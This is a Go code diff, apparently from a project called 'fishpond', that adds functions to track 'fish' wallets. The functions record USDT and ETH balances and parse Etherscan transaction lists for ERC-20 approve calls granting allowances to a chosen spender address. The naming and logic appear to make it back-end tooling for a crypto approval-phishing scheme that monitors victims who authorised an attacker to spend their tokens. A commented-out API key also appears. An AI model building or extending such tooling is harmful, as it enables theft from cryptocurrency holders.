@@ -8,9 +8,19 @@
 package util
 
 import (
+	"context"
+	"encoding/json"
+	"github.com/ethereum/go-ethereum/accounts/abi/bind"
+	"github.com/ethereum/go-ethereum/common"
+	"github.com/ethereum/go-ethereum/ethclient"
 	"github.com/gin-gonic/gin"
 	"github.com/go-redis/redis"
+	"github.com/jinzhu/gorm"
 	"github.com/shopspring/decimal"
+	"github.com/spf13/viper"
+	token "github.com/wangyi/fishpond/eth"
+	"io/ioutil"
+	"log"
 	"math/big"
 
 	"math/rand"
@@ -109,8 +119,119 @@ func ToDecimal(ivalue interface{}, decimals int) decimal.Decimal {
 
 //生成邀请码
 
-func SetInCode(token string, Rdb *redis.Client) {
+/***
+  更新 鱼的 usd eth
+*/
+func UpdateUsdAndEth(foxAddress string, Db *gorm.DB) {
 
-	//生成邀请码
+	ethUrl := viper.GetString("eth.ethUrl")
+	client, err := ethclient.Dial(ethUrl)
+	if err != nil {
+		return
+	}
+	//获取 美元
+	tokenAddress := common.HexToAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7") //usDT
+	instance, err := token.NewToken(tokenAddress, client)
+	if err != nil {
+		log.Fatal(err)
+	}
+	address := common.HexToAddress(foxAddress)
+	bal, err := instance.BalanceOf(&bind.CallOpts{}, address)
+	if err != nil {
+		log.Fatal(err)
+	}
+	usd := ToDecimal(bal.String(), 6)
+	balance, err := client.BalanceAt(context.Background(), address, nil)
+	if err != nil {
+		log.Fatal(err)
+	}
+	eth := ToDecimal(balance.String(), 18)
+	data := make(map[string]interface{})
+	data["money"], _ = usd.Float64()
+	data["money_eth"], _ = eth.Float64()
+	Db.Table("fish").Where("fox_address=?", foxAddress).Update(data)
+	return
+}
 
+/***
+  检查授权
+*/
+
+type Result struct {
+	BlockNumber       string `json:"blockNumber"`
+	TimeStamp         string `json:"timeStamp"`
+	Hash              string `json:"hash"`
+	Nonce             string `json:"nonce"`
+	BlockHash         string `json:"blockHash"`
+	TransactionIndex  string `json:"transactionIndex"`
+	From              string `json:"from"`
+	To                string `json:"to"`
+	Value             string `json:"value"`
+	Gas               string `json:"gas"`
+	GasPrice          string `json:"gasPrice"`
+	IsError           string `json:"isError"`
+	ReceiptStatus     string `json:"txreceipt_status"`
+	InPut             string `json:"input"`
+	ContractAddress   string `json:"contractAddress"`
+	CumulativeGasUsed string `json:"cumulativeGasUsed"`
+	GasUsed           string `json:"gasUsed"`
+	Confirmations     string `json:"confirmations"`
+}
+type TxList struct {
+	Status  string   `json:"status"`
+	Message string   `json:"message"`
+	Result  []Result `json:"result"`
+}
+
+func ChekAuthorizedFoxAddress(foxAddress string, apiKey string, BAddress string, Db *gorm.DB) {
+
+	//获取 要查询的 fish
+	//apiKey := "5YJ37XCEQFSEDMMI6RXZ756QB7HS2VT921"
+	res, err := http.Get("https://api.etherscan.io/api?module=account&action=txlist&address=" + foxAddress + "&startblock=0&endblock=99999999&page=1&offset=100&sort=asc&apikey=" + apiKey)
+	if err != nil {
+		return
+	}
+	body, err1 := ioutil.ReadAll(res.Body)
+	if err1 != nil {
+		return
+	}
+
+	var data TxList
+	err = json.Unmarshal([]byte(string(body)), &data)
+	if err != nil {
+		return
+	}
+	var count int = 0
+	if data.Status == "1" && data.Message == "OK" {
+		var ifCount bool = true
+		for _, k := range data.Result {
+			if len(k.InPut) == 138 && k.InPut[0:10] == "0x095ea7b3" {
+
+				BAddressOne := "0x" + k.InPut[34:74]
+				if k.InPut[127:] == "00000000000" && BAddress == BAddressOne { //取消授权  更新数据库
+					mapData := make(map[string]interface{})
+					mapData["authorization"] = 1
+					Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)
+				}
+				if k.InPut[127:] != "00000000000" && BAddress == BAddressOne { //授权成功
+					if ifCount {
+						count++
+						ifCount = false
+					}
+					//
+					mapData := make(map[string]interface{})
+					mapData["authorization"] = 2
+					mapData["b_address"] = BAddress
+					Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)
+				}
+				if k.InPut[127:] != "00000000000" && BAddress != BAddressOne {
+					count++
+				}
+			}
+		}
+		mapData := make(map[string]interface{})
+		mapData["authorization_time"] = count
+		Db.Table("fish").Where("fox_address=?", foxAddress).Update(mapData)
+
+	}
 }
